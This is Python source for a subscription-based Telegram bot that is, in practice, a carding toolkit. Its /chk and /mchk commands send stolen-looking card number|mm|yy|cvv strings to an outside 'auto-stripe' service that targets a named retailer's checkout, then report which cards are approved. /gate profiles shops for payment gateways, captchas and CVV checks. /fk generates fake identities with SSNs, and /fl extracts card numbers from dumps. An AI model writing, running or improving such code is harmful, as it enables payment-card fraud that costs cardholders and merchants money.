        country_name = (bin_details.get("country_name") or "N/A").upper()

        api_url = f"https://darkboy-auto-stripe.onrender.com/gateway=autostripe/key=darkboy/site=buildersdiscountwarehouse.com.au/cc={cc_normalized}"
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, timeout=25) as resp:
                if resp.status != 200:
                    raise Exception(f"HTTP {resp.status}")
                data = await resp.json()

        api_status = (data.get("status") or "Unknown").title()
        api_response = data.get("response") or "N/A"
        time_taken = round(time.time() - start_time, 2)

        if api_status.lower() == "approved":
            header = "❖❖❖\\[ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅ \\]❖❖❖"
        elif api_status.lower() == "declined":
            header = "❖❖❖\\[ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌ \\]❖❖❖"
        else:
            header = f"❖❖❖\\[ {escape_markdown(api_status, version=2)} \\]❖❖❖"

        formatted_response = f"_{escape_markdown(api_response, version=2)}_"

        final_text = (
            f"{header}\n"
            f"✘ Card        ➜ `{escape_markdown(cc_normalized, version=2)}`\n"
            "✘ Gateway     ➜ 𝓢𝘁𝗿𝗶𝗽𝗲 𝘈𝘂𝘁𝗵\n"
            f"✘ Response    ➜ {formatted_response}\n"
            "――――――――――――――――\n"
            f"✘ Brand       ➜ {escape_markdown(brand, version=2)}\n"
            f"✘ Issuer      ➜ {escape_markdown(issuer, version=2)}\n"
            f"✘ Country    ➜ {escape_markdown(country_name, version=2)}\n"
            "――――――――――――――――\n"
            f"✘ Request By  ➜ {escape_markdown(user.first_name, version=2)}\\[{escape_markdown(user_data.get('plan', 'Free'), version=2)}\\]\n"
            "✘ Developer   ➜ [kคli liຖนxx](tg://resolve?domain=K4linuxx)\n"
            f"✘ Time        ➜ {escape_markdown(str(time_taken), version=2)} seconds\n"
            "――――――――――――――――"
        )
        await processing_msg.edit_text(final_text, parse_mode=ParseMode.MARKDOWN_V2)

    except Exception as e:
        await processing_msg.edit_text(
            f"❌ API Error: `{escape_markdown(str(e), version=2)}`",
            parse_mode=ParseMode.MARKDOWN_V2
        )

async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    chat = update.effective_chat
    user_id = user.id

    # Block private usage unless plan is active
    if chat.type == "private":
        user_data = await get_user(user_id)
        if not user_data or user_data.get("plan", "").lower() in ["free", "n/a"]:
            await update.effective_message.reply_text(
                "🚫 *Private Usage Blocked*\n"
                "You cannot use this bot in private chat.\n\n"
                "Buy a plan or join our group to access tools for free.\n"
                "Get a subscription from @K4linuxx to use this bot.",
                parse_mode=ParseMode.MARKDOWN_V2
            )
            return

    # Cooldown check
    if not await enforce_cooldown(user_id, update):
        return

    # Get user data
    user_data = await get_user(user_id)
    if not user_data:
        await update.effective_message.reply_text(
            "❌ Could not fetch your user data. Try again later.",
            parse_mode=None
        )
        return

    # Check credits
    if user_data.get("credits", 0) <= 0:
        await update.effective_message.reply_text(
            "❌ You have no credits left. Please buy a plan to get more credits.",
            parse_mode=None
        )
        return

    # Parse card
    raw = context.args[0] if context.args else None
    if not raw or "|" not in raw:
        await update.effective_message.reply_text(
            "Usage: /chk number|mm|yy|cvv",
            parse_mode=None
        )
        return

    parts = raw.split("|")
    if len(parts) != 4:
        await update.effective_message.reply_text(
            "Invalid format. Use number|mm|yy|cvv (or yyyy for year).",
            parse_mode=None
        )
        return

    # Normalize year
    if len(parts[2]) == 4:
        parts[2] = parts[2][-2:]
    cc_normalized = "|".join(parts)

    # Deduct credit
    if not await consume_credit(user_id):
        await update.effective_message.reply_text(
            "❌ No credits left.",
            parse_mode=None
        )
        return

    # Send processing
    processing_text = (
        "═══\\[ 𝑷𝑹𝑶𝑪𝑬𝑺𝑺𝑰𝑵𝑮 \\]═══\n"
        f"• 𝘾𝙖𝙧𝙙 ➜ `{escape_markdown(cc_normalized, version=2)}`\n"
        "• 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ➜ 𝓢𝘁𝗿𝗶𝗽𝗲 𝘈𝘂𝘁𝗵\n"
        "• 𝙎𝙩𝙖𝙩𝙪𝙨 ➜ 𝑪𝒉𝒆𝒄𝒌𝒊𝒏𝒈\\.\\.\\.\n"
        "═════════════════════"
    )
    processing_msg = await update.effective_message.reply_text(
        processing_text,
        parse_mode=ParseMode.MARKDOWN_V2
    )

    # Background task
    asyncio.create_task(background_check(cc_normalized, parts, user, user_data, processing_msg))

import asyncio
import time
import aiohttp
import re
from telegram import Update
from telegram.constants import ParseMode
from telegram.helpers import escape_markdown
from telegram.ext import ContextTypes

from db import get_user, update_user  # your DB functions here

OWNER_ID = 8438505794  # Replace with your Telegram user ID

user_cooldowns = {}

async def check_authorization(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    # Only allow OWNER_ID in private chats
    if update.effective_chat.type == "private":
        return update.effective_user.id == OWNER_ID
    return True

async def enforce_cooldown(user_id: int, update: Update) -> bool:
    cooldown = 5  # seconds
    now = time.time()
    last = user_cooldowns.get(user_id, 0)
    if now - last < cooldown:
        remaining = round(cooldown - (now - last), 2)
        await update.effective_message.reply_text(
            escape_markdown(f"⏳ Cooldown active. Wait {remaining} seconds.", version=2),
            parse_mode=ParseMode.MARKDOWN_V2,
        )
        return False
    user_cooldowns[user_id] = now
    return True

async def consume_credit(user_id: int) -> bool:
    user_data = await get_user(user_id)
    if user_data and user_data.get("credits", 0) > 0:
        new_credits = user_data["credits"] - 1
        await update_user(user_id, credits=new_credits)
        return True
    return False

async def check_cards_background(cards_to_check, user_id, user_first_name, processing_msg, start_time):
    approved_count = declined_count = error_count = checked_count = 0
    results = []
    total_cards = len(cards_to_check)

    for raw in cards_to_check:
        user_data = await get_user(user_id)
        if user_data.get('credits', 0) <= 0:
            results.append("❌ Out of credits.")
            error_count += 1
            break

        parts = raw.split("|")
        if len(parts) != 4:
            results.append(f"❌ Invalid card format: `{escape_markdown(raw, version=2)}`")
            error_count += 1
            continue

        # Normalize year to two digits
        if len(parts[2]) == 4:
            parts[2] = parts[2][-2:]
        cc_normalized = "|".join(parts)

        if not await consume_credit(user_id):
            results.append(f"❌ Failed to deduct credit for card `{escape_markdown(raw, version=2)}`.")
            error_count += 1
            break

        api_url = f"https://darkboy-auto-stripe.onrender.com/gateway=autostripe/key=darkboy/site=buildersdiscountwarehouse.com.au/cc={cc_normalized}"
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(api_url, timeout=25) as resp:
                    if resp.status != 200:
                        raise Exception(f"HTTP {resp.status}")
                    data = await resp.json()
        except Exception as e:
            results.append(f"❌ API Error for card `{escape_markdown(raw, version=2)}`: {escape_markdown(str(e), version=2)}")
            error_count += 1
            checked_count += 1
            continue

        api_status = (data.get("status") or "Unknown").title()
        api_response = data.get("response") or "N/A"

        emoji = "❓"
        if api_status.lower() == "approved":
            approved_count += 1
            emoji = "✅"
        elif api_status.lower() == "declined":
            declined_count += 1
            emoji = "❌"
        else:
            error_count += 1
        checked_count += 1

        card_result = (
            f"`{escape_markdown(cc_normalized, version=2)}`\n"
            f"𝐒𝐭𝐚𝐭𝐮𝐬➳ {emoji} {escape_markdown(api_response, version=2)}"
        )
        results.append(card_result)

        current_time_taken = round(time.time() - start_time, 2)
        current_summary = (
            f"✘ 𝐓𝐨𝐭𝐚𝐥↣{total_cards}\n"
            f"✘ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝↣{checked_count}\n"
            f"✘ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝↣{approved_count}\n"
            f"✘ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝↣{declined_count}\n"
            f"✘ 𝐄𝐫𝐫𝐨𝐫𝐬↣{error_count}\n"
            f"✘ 𝐓𝐢𝐦𝐞↣{current_time_taken} 𝐒\n"
            f"\n𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸\n"
            f"──────── ⸙ ─────────"
        )
        try:
            await processing_msg.edit_text(
                escape_markdown(current_summary, version=2) + "\n\n" + "\n──────── ⸙ ─────────\n".join(results),
                parse_mode=ParseMode.MARKDOWN_V2
            )
        except Exception:
            pass

    final_time_taken = round(time.time() - start_time, 2)
    final_summary = (
        f"✘ 𝐓𝐨𝐭𝐚𝐥↣{total_cards}\n"
        f"✘ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝↣{checked_count}\n"
        f"✘ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝↣{approved_count}\n"
        f"✘ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝↣{declined_count}\n"
        f"✘ 𝐄𝐫𝐫𝐨𝐫𝐬↣{error_count}\n"
        f"✘ 𝐓𝐢𝐦𝐞↣{final_time_taken} 𝐒\n"
        f"\n𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸\n"
        f"──────── ⸙ ─────────"
    )
    await processing_msg.edit_text(
        escape_markdown(final_summary, version=2) + "\n\n" + "\n──────── ⸙ ─────────\n".join(results) + "\n──────── ⸙ ─────────",
        parse_mode=ParseMode.MARKDOWN_V2
    )

async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Private chat: only OWNER_ID allowed
    if update.effective_chat.type == "private" and update.effective_user.id != OWNER_ID:
        await update.effective_message.reply_text(
            "❌ Private access is blocked.\nContact @YourOwnerUsername to buy subscription.",
            parse_mode=None
        )
        return

    user = update.effective_user
    user_id = user.id

    if not await enforce_cooldown(user_id, update):
        return

    raw_cards = ""
    if context.args:
        raw_cards = ' '.join(context.args)
    elif update.effective_message.reply_to_message and update.effective_message.reply_to_message.text:
        raw_cards = update.effective_message.reply_to_message.text

    if not raw_cards:
        await update.effective_message.reply_text(
            "⚠️ Usage: /mchk number|mm|yy|cvv",
            parse_mode=None
        )
        return

    card_pattern = re.compile(r"(\d{13,16}\|\d{1,2}\|(?:\d{2}|\d{4})\|\d{3,4})")
    card_lines = card_pattern.findall(raw_cards)

    if not card_lines:
        await update.effective_message.reply_text(
            "⚠️ Please provide at least one card in the format: number|mm|yy|cvv.",
            parse_mode=None
        )
        return

    # Limit cards to first 10
    cards_to_check = card_lines[:10]
    if len(card_lines) > 10:
        await update.effective_message.reply_text(
            "⚠️ Only 10 cards are allowed. Checking the first 10 now.",
            parse_mode=None
        )

    # Fetch fresh user data from DB (credits and plan)
    user_data = await get_user(user_id)
    if not user_data:
        await update.effective_message.reply_text(
            "❌ Could not fetch your user data. Try again later.",
            parse_mode=None
        )
        return

    if user_data.get('credits', 0) <= 0:
        await update.effective_message.reply_text(
            "❌ You have no credits left. Please buy a plan to get more credits.",
            parse_mode=None
        )
        return

    processing_msg = await update.effective_message.reply_text("🔎Processing...", parse_mode=None)
    start_time = time.time()

    # Run background task (non-blocking)
    asyncio.create_task(
        check_cards_background(cards_to_check, user_id, user.first_name, processing_msg, start_time)
    )


import asyncio
import aiohttp
import logging
from urllib.parse import urlparse, urljoin
from typing import Dict, List, Set
from bs4 import BeautifulSoup
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes
from telegram.helpers import escape_markdown as escape_markdown_v2

logger = logging.getLogger(__name__)

JS_FETCH_LIMIT = 12
REQUEST_TIMEOUT = 10
MAX_CONTENT_SIZE = 450_000
USER_AGENT = "Mozilla/5.0 (compatible; GatewayScanner/1.0)"
RETRY_ATTEMPTS = 2
RETRY_DELAY = 1

GATEWAY_SIGNATURES: Dict[str, List[str]] = {
    "Stripe": ["js.stripe.com", "api.stripe.com", "checkout.stripe.com", "stripe.com"],
    "PayPal": ["paypal.com", "paypalobjects.com", "api.paypal.com", "www.paypal.com/sdk/js"],
    "Adyen": ["adyenpayments.com", "live.adyen.com", "checkoutshopper-live.adyenpayments.com"],
    "Braintree": ["braintreegateway.com", "assets.braintreegateway.com", "api.braintreegateway.com"],
    "Square": ["squareup.com", "js.squareup.com", "connect.squareup.com"],
    "Authorize.Net": ["authorize.net", "secure2.authorize.net", "accept.authorize.net", "authorizenet.com"],
    "Worldpay": ["worldpay.com", "secure.worldpay.com"],
    "eWAY": ["eway.com.au", "secure.ewaypayments.com"],
    "Klarna": ["klarna.com", "cdn.klarna.com", "api.klarna.com"],
    "Mollie": ["mollie.com", "api.mollie.com"],
    "Skrill": ["skrill.com"],
    "Neteller": ["neteller.com"],
    "Coinbase Commerce": ["commerce.coinbase.com"],
    "BitPay": ["bitpay.com"],
    "NOWPayments": ["nowpayments.io"],
    "Binance Pay": ["pay.binance.com"],
    "Apple Pay": ["apple-pay-gateway.apple.com"],
    "Google Pay": ["pay.google.com", "google.com/pay"],
    "Alipay": ["alipay.com", "render.alipay.com", "intl.alipay.com"],
    "WeChat Pay": ["wx.tenpay.com", "pay.wechat.com"],
    "Mercado Pago": ["mercadopago.com", "api.mercadopago.com"],
    "PagSeguro": ["pagseguro.uol.com.br"],
    "PayU": ["payu.com", "secure.payu.com", "payu.in"],
    "Paytm": ["paytm.com", "securegw.paytm.in"],
    "Razorpay": ["razorpay.com", "checkout.razorpay.com", "api.razorpay.com"],
    "Payoneer": ["payoneer.com"],
    "2Checkout": ["2checkout.com", "2co.com"],
    "2C2P": ["2c2p.com"],
    "Checkout.com": ["checkout.com", "api.checkout.com"],
    "CyberSource": ["cybersource.com", "secureacceptance.cybersource.com"],
    "Elavon": ["convergepay.com"],
    "First Data / Fiserv": ["fdms.com"],
    "Ingenico": ["ingenico.com", "paymentpage.ingenico.com"],
    "Clover": ["clover.com"],
    "WooPayments": ["woocommerce.com", "woocommerce-checkout"],
    "Shopify Payments": ["shopify.com", "cdn.shopify.com", "shopifycloud.com"],
    "Magento Payments": ["magento.com"],
    "OpenCart": ["opencart.com"],
    "PrestaShop": ["prestashop.com"],
    "BigCommerce": ["bigcommerce.com"],
    "Paystack": ["paystack.com"],
    "Flutterwave": ["flutterwave.com"],
    "bKash": ["bkash.com"],
    "M-Pesa": ["safaricom.com"],
    "PhonePe": ["phonepe.com"],
    "Qiwi": ["qiwi.com"],
    "Sofort": ["sofort.com"],
    "iDEAL": ["ideal.nl"],
    "Bancontact": ["bancontact.com"],
    "Giropay": ["giropay.de"],
    "BPAY": ["bpay.com.au"],
    "PayPoint": ["paypoint.com"],
    "Paysafe": ["paysafe.com"],
    "Opayo (Sage Pay)": ["sagepay.com", "opayo.co.uk"],
    "Payfast": ["payfast.co.za"],
    "Paymaya": ["paymaya.com"],
    "Paymentwall": ["paymentwall.com"],
    "SafeCharge": ["safecharge.com"],
    "CardConnect": ["cardconnect.com"],
    "Helcim": ["helcim.com"],
    "Novalnet": ["novalnet.com"],
    "BlueSnap": ["bluesnap.com"],
    "Paddle": ["paddle.com"],
    "FastSpring": ["fastspring.com"],
    "Afterpay": ["afterpay.com"],
    "Sezzle": ["sezzle.com"],
    "PayPay": ["paypay.ne.jp"],
    "WePay": ["wepay.com"],
    "Trust Payments": ["trustpayments.com"],
    "USAePay": ["usaepay.com"],
    "Stax": ["staxpayments.com"],
    "UnionPay": ["unionpaysecure.com"],
    "Mir": ["mironline.ru"],
    "Advcash": ["advcash.com"],
    "CoinPayments": ["coinpayments.net"],
    "Crypto.com Pay": ["crypto.com"],
}

CAPTCHA_SIGNATURES = {
    "Google reCAPTCHA": ["www.google.com/recaptcha", "recaptcha.net"],
    "hCaptcha": ["hcaptcha.com"],
    "Cloudflare Turnstile": ["challenges.cloudflare.com"],
    "FunCaptcha": ["funcaptcha.com"],
}

PLATFORM_SIGNATURES = {
    "WooCommerce": ["woocommerce"],
    "Shopify": ["shopify"],
    "Magento": ["magento"],
    "PrestaShop": ["prestashop"],
    "OpenCart": ["opencart"],
    "BigCommerce": ["bigcommerce"],
    "Wix": ["wix.com"],
    "Squarespace": ["squarespace.com"],
}

async def fetch_text(session, url):
    for _ in range(RETRY_ATTEMPTS):
        try:
            async with session.get(url, timeout=REQUEST_TIMEOUT) as r:
                text = await r.text(errors="ignore")
                if len(text) > MAX_CONTENT_SIZE:
                    text = text[:MAX_CONTENT_SIZE]
                return r.status, dict(r.headers), text
        except Exception:
            await asyncio.sleep(RETRY_DELAY)
    return None, {}, ""

def search_signatures(text: str, sigs: Dict[str, List[str]]) -> Set[str]:
    found = set()
    text_low = text.lower()
    for name, patterns in sigs.items():
        for pat in patterns:
            if pat.lower() in text_low:
                found.add(name)
                break
    return found

def find_cvv(soup: BeautifulSoup) -> bool:
    for inp in soup.find_all("input"):
        name_id = (inp.get("name","") + inp.get("id","")).lower()
        for key in ("cvv", "cvc", "security_code"):
            if key in name_id:
                return True
    return False

def search_attrs_for_gateways(soup: BeautifulSoup, sigs: Dict[str, List[str]]) -> Set[str]:
    found = set()
    attrs_to_check = ["src", "href", "action", "data-src"]
    for tag in soup.find_all(True):  # all tags
        for attr in attrs_to_check:
            val = tag.get(attr, "")
            val_low = val.lower()
            for name, patterns in sigs.items():
                for pat in patterns:
                    if pat.lower() in val_low:
                        found.add(name)
                        break
    return found

async def scan_site(url: str) -> Dict:
    result = {
        "site": url,
        "gateways": set(),
        "captchas": set(),
        "platforms": set(),
        "cloudflare": False,
        "cvv": False,
        "security": set(),
        "status": "Unknown"
    }
    if not url.startswith("http"):
        url = "https://" + url
    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}"
    async with aiohttp.ClientSession(headers={"User-Agent": USER_AGENT}) as session:
        status, headers, html = await fetch_text(session, url)
        if not status:
            result["status"] = "Unreachable"
            return result
        result["status"] = f"Online ({status})"

        headers_lower = {k.lower(): v for k,v in headers.items()}
        server_header = headers_lower.get("server", "")
        if "cloudflare" in server_header.lower():
            result["cloudflare"] = True
        if "strict-transport-security" in headers_lower:
            result["security"].add("HSTS")
        if "content-security-policy" in headers_lower:
            result["security"].add("CSP")

        soup = BeautifulSoup(html, "html.parser")

        # Search gateways in raw html text + attributes (src, href, action, data-src)
        gateways_html_text = search_signatures(html, GATEWAY_SIGNATURES)
        gateways_attrs = search_attrs_for_gateways(soup, GATEWAY_SIGNATURES)
        result["gateways"] |= gateways_html_text | gateways_attrs

        # Captchas detection
        captchas_html = search_signatures(html, CAPTCHA_SIGNATURES)
        captchas_attrs = search_attrs_for_gateways(soup, CAPTCHA_SIGNATURES)
        result["captchas"] |= captchas_html | captchas_attrs

        # Platforms detection
        platforms_html = search_signatures(html, PLATFORM_SIGNATURES)
        platforms_attrs = search_attrs_for_gateways(soup, PLATFORM_SIGNATURES)
        result["platforms"] |= platforms_html | platforms_attrs

        # CVV fields
        if find_cvv(soup):
            result["cvv"] = True

        # Fetch and scan JS files linked in script src tags (limit JS_FETCH_LIMIT)
        scripts = soup.find_all("script", src=True)[:JS_FETCH_LIMIT]
        for tag in scripts:
            s_url = urljoin(base, tag["src"])
            _, _, js_text = await fetch_text(session, s_url)
            if not js_text:
                continue
            result["gateways"] |= search_signatures(js_text, GATEWAY_SIGNATURES)
            result["captchas"] |= search_signatures(js_text, CAPTCHA_SIGNATURES)
            result["platforms"] |= search_signatures(js_text, PLATFORM_SIGNATURES)

    return result


async def gate_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Block command usage in private chats
    if update.effective_chat.type == 'private':
        await update.message.reply_text(
            "🚫 *Private access blocked.*\nContact @K4linuxx to buy a subscription or use free in our group.",
            parse_mode=ParseMode.MARKDOWN_V2
        )
        return

    if not context.args:
        return await update.message.reply_text("Usage: /gate <url>")

    target = context.args[0]

    msg = await update.message.reply_text(
        f"═══[ 𝙂𝘼𝙏𝙀𝙒𝘼𝙔 𝙎𝘾𝘼𝙉 ]═══\n"
        f"✘ 𝙎𝙞𝙩𝙚 ➜ `{escape_markdown_v2(target)}`\n"
        f"✘ 𝙎𝙩𝙖𝙩𝙪𝙨 ➜ `Checking...`\n"
        f"═════════════════════",
        parse_mode=ParseMode.MARKDOWN_V2
    )

    data = await scan_site(target)

    def md_code(text: str) -> str:
        return f"`{escape_markdown_v2(text)}`"

    # Prepare gateways text
    if data["gateways"]:
        gateways_escaped = [escape_markdown_v2(g) for g in sorted(data["gateways"])]
        gateways = md_code(" | ".join(gateways_escaped))
    else:
        gateways = md_code("None")

    # Prepare platforms text
    if data["platforms"]:
        platforms_escaped = [escape_markdown_v2(p) for p in sorted(data["platforms"])]
        platforms = md_code(", ".join(platforms_escaped))
    else:
        platforms = md_code("Unknown")

    # Prepare security text
    if data["security"]:
        security_escaped = [escape_markdown_v2(s) for s in sorted(data["security"])]
        security = md_code(", ".join(security_escaped))
    else:
        security = md_code("None")

    status = md_code(data["status"])
    captcha_text = md_code("Yes ✅") if data["captchas"] else md_code("No ❌")
    cloudflare = md_code("✅") if data["cloudflare"] else md_code("❌")
    cvv = md_code("Required ✅") if data["cvv"] else md_code("Not observed ❌")

    final_text = (
        f"═══[ 𝙂𝘼𝙏𝙀𝙒𝘼𝙔 𝙎𝘾𝘼𝙉 ]═══\n"
        f"✘ 𝙎𝙞𝙩𝙚 ➜ {md_code(target)}\n"
        f"✘ 𝙂𝙖𝙩𝙚𝙬𝙖𝙮𝙨 ➜ {gateways}\n"
        f"✘ 𝘾𝙇𝙊𝙐𝘿𝙁𝙇𝘼𝙍𝙀 ➜ {cloudflare}\n"
        f"✘ 𝘾𝘼𝙋𝙏𝘾𝙃𝘼 ➜ {captcha_text}\n"
        f"✘ 𝘾𝙑𝙑 ➜ {cvv}\n"
        f"✘ 𝗜𝗻𝗯𝘂𝗶𝗹𝘁 𝗦𝘆𝘀𝘁𝗲𝗺 ➜ {platforms}\n"
        f"✘ 𝗦𝗲𝗰𝘂𝗿𝗶𝘁𝘆 ➜ {security}\n"
        f"✘ 𝗦𝘁𝗮𝘁𝘂𝘀 ➜ {status}\n"
        f"═════════════════════"
    )

    await msg.edit_text(final_text, parse_mode=ParseMode.MARKDOWN_V2)



from faker import Faker

async def fk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Generates fake identity info."""
    if not await check_authorization(update, context):
        return
    if not await enforce_cooldown(update.effective_user.id, update):
        return

    user_id = update.effective_user.id
    user_data = await get_user(user_id)

    if user_data['credits'] <= 0:
        return await update.effective_message.reply_text(
            "❌ You have no credits left\\. Please get a subscription to use this command\\.",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    if not await consume_credit(user_id):
        return await update.effective_message.reply_text(
            "❌ You have no credits left\\. Please get a subscription to use this command\\.",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    country_code = context.args[0] if context.args else 'en_US'
    try:
        fake = Faker(country_code)
    except:
        fake = Faker('en_US')

    name = escape_markdown_v2(fake.name())
    dob = escape_markdown_v2(fake.date_of_birth().strftime('%Y-%m-%d'))
    ssn = escape_markdown_v2(fake.ssn())
    email = escape_markdown_v2(fake.email())
    username = escape_markdown_v2(fake.user_name())
    phone = escape_markdown_v2(fake.phone_number())
    job = escape_markdown_v2(fake.job())
    company = escape_markdown_v2(fake.company())
    street = escape_markdown_v2(fake.street_address())
    address2 = escape_markdown_v2(fake.secondary_address())
    city = escape_markdown_v2(fake.city())
    state = escape_markdown_v2(fake.state())
    zip_code = escape_markdown_v2(fake.zipcode())
    country = escape_markdown_v2(fake.country())
    ip = escape_markdown_v2(fake.ipv4_public())
    ua = escape_markdown_v2(fake.user_agent())

    output = (
        "╭━━━[ 🧑‍💻 𝙁𝙖𝙠𝙚 𝙄𝙣𝙛𝙤 ]━━━━⬣\n"
        f"┣ ❏ 𝙉𝙖𝙢𝙚      ➳ `{name}`\n"
        f"┣ ❏ 𝘿𝙤𝘽       ➳ `{dob}`\n"
        f"┣ ❏ 𝙎𝙎𝙉       ➳ `{ssn}`\n"
        f"┣ ❏ 𝙀𝙢𝙖𝙞𝙡     ➳ `{email}`\n"
        f"┣ ❏ 𝙐𝙨𝙚𝙧𝙣𝙖𝙢𝙚 ➳ `{username}`\n"
        f"┣ ❏ 𝙋𝙝𝙤𝙣𝙚     ➳ `{phone}`\n"
        f"┣ ❏ 𝙅𝙤𝙗       ➳ `{job}`\n"
        f"┣ ❏ 𝘾𝙤𝙢𝙥𝙖𝙣𝙮   ➳ `{company}`\n"
        f"┣ ❏ 𝙎𝙩𝙧𝙚𝙚𝙩    ➳ `{street}`\n"
        f"┣ ❏ 𝘼𝙙𝙙𝙧𝙚𝙨𝙨 2 ➳ `{address2}`\n"
        f"┣ ❏ 𝘾𝙞𝙩𝙮      ➳ `{city}`\n"
        f"┣ ❏ 𝙎𝙩𝙖𝙩𝙚     ➳ `{state}`\n"
        f"┣ ❏ 𝙕𝙞𝙥       ➳ `{zip_code}`\n"
        f"┣ ❏ 𝘾𝙤𝙪𝙣𝙩𝙧𝙮   ➳ `{country}`\n"
        f"┣ ❏ 𝙄𝙋        ➳ `{ip}`\n"
        f"┣ ❏ 𝙐𝘼        ➳ `{ua}`\n"
        "╰━━━━━━━━━━━━━━━━━━⬣"
    )

    await update.effective_message.reply_text(output, parse_mode=ParseMode.MARKDOWN_V2)

import re

def escape_markdown_v2(text: str) -> str:
    """Escapes special characters for Telegram MarkdownV2."""
    return re.sub(r'([_*\[\]()~`>#+\-=|{}.!\\])', r'\\\1', str(text))

async def fl_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Extracts all cards from a dump (message or reply)."""
    if not await check_authorization(update, context):
        return

    user_id = update.effective_user.id
    user_data = await get_user(user_id)

    if user_data['credits'] <= 0:
        return await update.effective_message.reply_text(
            "❌ You have no credits left\\. Please get a subscription to use this command\\.",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    # Determine input text (from reply or args)
    if update.message.reply_to_message and update.message.reply_to_message.text:
        dump = update.message.reply_to_message.text
    elif context.args:
        dump = " ".join(context.args)
    else:
        return await update.effective_message.reply_text(
            "❌ Please provide or reply to a dump containing cards\\. Usage: `/fl <dump or reply>`",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    if not await consume_credit(user_id):
        return await update.effective_message.reply_text(
            "❌ You have no credits left\\. Please get a subscription to use this command\\.",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    # Match CCs with optional |MM|YY|CVV
    cards_found = re.findall(r'\b\d{13,16}(?:\|\d{2}\|\d{2}(?:\|\d{3,4})?)?\b', dump)
    count = len(cards_found)

    if cards_found:
        extracted_cards_text = "\n".join([f"`{escape_markdown_v2(card)}`" for card in cards_found])
    else:
        extracted_cards_text = "_No cards found in the provided text\\._"

    msg = (
        f"╭━━━ [ 💳 𝗘𝘅𝘁𝗿𝗮𝗰𝘁𝗲𝗱 𝗖𝗮𝗿𝗱𝘀 ] ━━━⬣\n"
        f"┣ ❏ Total ➳ `{count}`\n"
        f"╰━━━━━━━━━━━━━━━━━━━━⬣\n\n"
        f"{extracted_cards_text}"
    )

    await update.effective_message.reply_text(msg, parse_mode=ParseMode.MARKDOWN_V2)



import psutil
from telegram.constants import ParseMode
import re

def escape_markdown_v2(text: str) -> str:
    """Escapes special characters for Telegram MarkdownV2."""
    return re.sub(r'([_*\[\]()~`>#+\-=|{}.!\\])', r'\\\1', str(text))

async def get_total_users():
    """Returns total number of users from the PostgreSQL database."""
    from db import get_all_users  # Adjust this to your actual DB call
    users = await get_all_users()
    return len(users)

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Checks and reports bot system status."""
    if not await check_authorization(update, context):
        return

    user_id = update.effective_user.id
    user_data = await get_user(user_id)

    if user_data['credits'] <= 0:
        return await update.effective_message.reply_text(
            "❌ You have no credits left\\. Please get a subscription to use this command\\.",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    if not await consume_credit(user_id):
        return await update.effective_message.reply_text(
            "❌ You have no credits left\\. Please get a subscription to use this command\\.",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    cpu_usage = psutil.cpu_percent(interval=1)
    memory_info = psutil.virtual_memory()
    total_memory = memory_info.total / (1024 ** 2)  # MB
    memory_percent = memory_info.percent
    total_users = await get_total_users()

    status_message = (
        "╭━━━ 𝐁𝐨𝐭 𝐒𝐭𝐚𝐭𝐮𝐬 ━━━━⬣\n"
        f"┣ ❏ 𝖢𝖯𝖴 𝖴𝗌𝖺𝗀𝖾 ➳ `{cpu_usage}%`\n"
        f"┣ ❏ 𝖱𝖠𝖬 𝖴𝗌𝖺𝗀𝖾 ➳ `{memory_percent}%`\n"
        f"┣ ❏ 𝖳𝗈𝗍𝖺𝗅 𝖱𝖠𝖬 ➳ `{total_memory:.2f} MB`\n"
        f"┣ ❏ 𝖳𝗈𝗍𝖺𝗅 𝖴𝗌𝖾𝗋𝗌 ➳ `{total_users}`\n"
        f"╰━━━━━━━━━━━━━━━━━━━⬣"
    )

    await update.effective_message.reply_text(
        status_message,
        parse_mode=ParseMode.MARKDOWN_V2
    )


# === OWNER-ONLY COMMANDS ===
import re
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

from config import AUTHORIZED_CHATS
from db import get_all_users  # Ensure this exists in db.py

def escape_markdown_v2(text: str) -> str:
    return re.sub(r'([_*\[\]()~`>#+\-=|{}.!\\])', r'\\\1', str(text))

async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Shows all admin commands, authorized groups, and private plan users."""

    admin_commands_list = (
        "• `/give_starter <user_id>`: Give 7\\-day Starter Plan\n"
        "• `/give_premium <user_id>`: Give 30\\-day Premium Plan\n"
        "• `/give_plus <user_id>`: Give 60\\-day Plus Plan\n"
        "• `/give_custom <user_id>`: Give Custom Plan\n"
        "• `/take_plan <user_id>`: Remove plan & private access\n"
        "• `/au <chat_id>`: Authorize a group\n"
        "• `/rauth <user_id>`: Remove private user auth\n"
        "• `/gen_codes`: Generate 10 Starter Plan codes"
    )

    # Authorized Groups
    authorized_groups_list = []
    for chat_id in AUTHORIZED_CHATS:
        try:
            chat = await context.bot.get_chat(chat_id)
            name = escape_markdown_v2(chat.title or "N/A")
        except Exception:
            name = "Unknown or Left Group"
        escaped_id = escape_markdown_v2(str(chat_id))
